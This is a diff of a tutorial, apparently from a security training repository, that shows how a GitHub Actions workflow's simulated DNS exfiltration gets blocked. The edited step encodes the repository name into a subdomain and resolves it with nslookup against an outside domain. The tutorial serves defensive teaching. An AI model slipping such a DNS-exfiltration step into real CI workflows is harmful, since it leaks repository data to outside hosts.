@@ -55,13 +55,14 @@ Learn how to prevent DNS exfiltration from a GitHub Actions worklow.
 
     ```
     - name: Simulate DNS traffic
-      run: |
-        domain="${GITHUB_REPOSITORY}.stepsecurity.io"
-        nslookup "${domain}"
+        run: |
+          domain="${GITHUB_REPOSITORY}.stepsecurity.io"
+          domain=${domain//\//-}
+          nslookup "${domain}"
     ```
 
 9. This change should cause the workflow to run, as it is set to run on push.
 
-10. Observe that the workflow shows an annotation that the DNS resolution for the call is blocked. 
+10. Observe that the workflow shows an annotation that the DNS resolution for the call is blocked. If you look at the build logs, you will notice that the bash script did not recive a valid response from the DNS server, and the exfiltration attempt was blocked. 
 
-    <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/OutboundCallBlocked.png" alt="Blocked calls are shown in Red" width="800">
+    <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/DNSExfilBlocked.png" alt="Blocked calls are shown in Red" width="800">
